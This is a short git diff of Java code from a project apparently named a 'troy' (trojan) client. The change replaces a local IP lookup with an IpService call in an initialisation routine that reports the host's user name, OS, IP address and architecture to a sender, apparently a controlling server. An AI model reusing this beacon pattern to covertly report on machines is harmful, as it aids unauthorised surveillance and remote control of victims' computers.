@@ -2,11 +2,10 @@ package ch.lebois.troyclient.main;
 
 import ch.lebois.troyclient.service.Console;
 import ch.lebois.troyclient.service.DownloadService;
+import ch.lebois.troyclient.service.IpService;
 import ch.lebois.troyclient.service.Sender;
 import ch.lebois.troyclient.service.WebHandler;
 import java.io.File;
-import java.net.InetAddress;
-import java.net.UnknownHostException;
 
 /**
  * Project: Hermann
@@ -44,11 +43,7 @@ public class ConfigureInit {
         SystemVariables.SENDER.send("user", System.getProperty("user.name"));
         SystemVariables.SENDER.send("os", System.getProperty("os.name"));
         System.out.println("OS\t\t" + System.getProperty("os.name"));
-        try {
-            SystemVariables.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
-        } catch (UnknownHostException e) {
-            e.printStackTrace();
-        }
+        SystemVariables.SENDER.send("ip", new IpService().getIp());
         SystemVariables.SENDER.send("arch", version);
         System.out.println("Version\t" + version);
         SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
